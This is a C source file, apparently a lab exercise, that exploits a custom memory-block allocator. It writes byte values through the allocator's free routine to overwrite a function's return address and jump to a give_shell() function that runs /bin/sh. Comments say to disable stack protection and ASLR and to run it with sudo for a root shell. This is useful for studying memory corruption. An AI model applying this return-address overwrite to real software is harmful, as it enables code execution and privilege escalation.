#include <stdio.h>
#include <stdlib.h>

#include "memblock.h"

void give_shell() {
  printf("you get a shell\n");
  system("/bin/sh");
}

void do_test() {
  int array[10];
  int *ptr;

  printf("&array = %p\n", &array);
  printf("&give_shell = %p\n", &give_shell);

  int ebp;
  asm("movl %%ebp, %0;"
      :"=r"(ebp)
     );

  printf("$ebp = %p\n", (void*)ebp);
  printf("ret address = %p\n", (char*)&array + ebp + 0x4);

  struct memblock int_memblock;

  /*
   * compile without stack overflow protection
   * disable ASLR
   * 
   * use init_mem to have address or array in avail,
   * write offset to targetted memory location + data(byte) to be written
   * at the first location in the array
   * 
   * use use_mem,
   * avail will have targetted memory location + data
   * 
   * use free_mem with first param as targetted address(return address)
   * and the data is written to the targetted address
   *
   * exploit to get shell
   * run the executable with sudo to get root shell
   */

  /* 
   * write the return address to array[0] + data
   * array[0] = offset to ebp + 4 bytes for ebp on stack,
   * array[0] += {subsequent bytes of addr of give_shell} + {1, 2, 3...}
   */

  init_mem(int_memblock, int, array, 10);
  array[0] = (ebp - (int)&array) + 0x4 + 0x0d;
  ptr = use_mem(int, int_memblock);
  ptr = (int*)((char*)&array + (ebp - (int)&array) + 0x4);
  free_mem(ptr, int_memblock);

  init_mem(int_memblock, int, array, 10);
  array[0] = (ebp - (int)&array) + 0x4 + 0x1 + 0x62;
  ptr = use_mem(int, int_memblock);
  ptr = (int*)((char*)&array + (ebp - (int)&array) + 0x4 + 0x1);
  free_mem(ptr, int_memblock);

  init_mem(int_memblock, int, array, 10);
  array[0] = (ebp - (int)&array) + 0x4 + 0x2 + 0x55;
  ptr = use_mem(int, int_memblock);
  ptr = (int*)((char*)&array + (ebp - (int)&array) + 0x4 + 0x2);
  free_mem(ptr, int_memblock);

  init_mem(int_memblock, int, array, 10);
  array[0] = (ebp - (int)&array) + 0x4 + 0x3 + 0x56;
  ptr = use_mem(int, int_memblock);
  ptr = (int*)((char*)&array + (ebp - (int)&array) + 0x4 + 0x3);
  free_mem(ptr, int_memblock);

  printf("bye\n");
}

int main() {
  do_test();
  return 0;
}
